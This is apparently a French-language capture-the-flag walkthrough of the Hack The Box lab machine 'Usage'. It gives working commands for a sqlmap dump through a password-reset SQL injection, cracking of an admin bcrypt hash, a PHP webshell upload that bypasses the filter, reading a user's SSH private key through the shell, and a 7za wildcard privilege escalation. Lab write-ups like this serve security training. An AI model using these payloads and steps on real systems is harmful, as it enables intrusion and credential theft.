  # Usage

	echo "10.10.11.18 usage.htb" >> /etc/hosts
    echo "10.10.11.18 admin.usage.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.18 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.18 -oN nmap.txt
	feroxbuster --silent -u http://usage.htb
	
Scans classiques.

    PORT      STATE    SERVICE  VERSION
    22/tcp    open     ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
    80/tcp    open     http     nginx 1.18.0 (Ubuntu)


Simple page de login avec possibilité de s'enregistrer sur le site et fonctionnalité de reset de mot de passe.

Injection SQL dans le formulaire de reset de mot de passe : 

    sqlmap -r req.txt --level 5 --risk 3 -p email --batch --dump-all --threads 10
    
    sqlmap -r req.txt --level 5 --risk 3 -p email --batch -D usage_blog -T admin_users -C username,password --dump --threads 10

Cassage du hash de l'administrateur : 

    hashid -m '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2'
    hashcat -m 3200 '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' --force

On peut se connecter au panel d'administration du site.

Upload d'images possible sur http://admin.usage.htb/admin/auth/setting et les fichiers arrivent dans http://admin.usage.htb/uploads/images/FICHIER


Simble upload de webshell avec bypass sur Burp : 

    ------WebKitFormBoundarycrbfVBn5PbxQLWYs

    Content-Disposition: form-data; name="avatar"; filename="image.php"

    Content-Type: application/php

    <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>


L'exécution de commandes fonctionne bien : 

    http://admin.usage.htb/uploads/images/image.php?cmd=id


Récupération de la clé SSH de l'utilisateur "dash" :

    http://admin.usage.htb/uploads/images/shell.php?cmd=cat%20%2Fhome%2Fdash%2F.ssh%2Fid_rsa

	ssh dash@10.10.11.18 -i id_rsa
	cat user.txt	 

## Pivoting

Mot de passe en clair dans le dossier :

    ls
    cat .monitrc
    su xander

## Élévation de privilèges

	sudo -l
	
> (ALL : ALL) NOPASSWD: /usr/bin/usage_management

    strings /usr/bin/usage_management

On voit la ligne suivante : 

  > /usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *

Voir : https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z

    cd /var/www/html
    touch @test; ln -sf /root/root.txt test
    sudo /usr/bin/usage_management
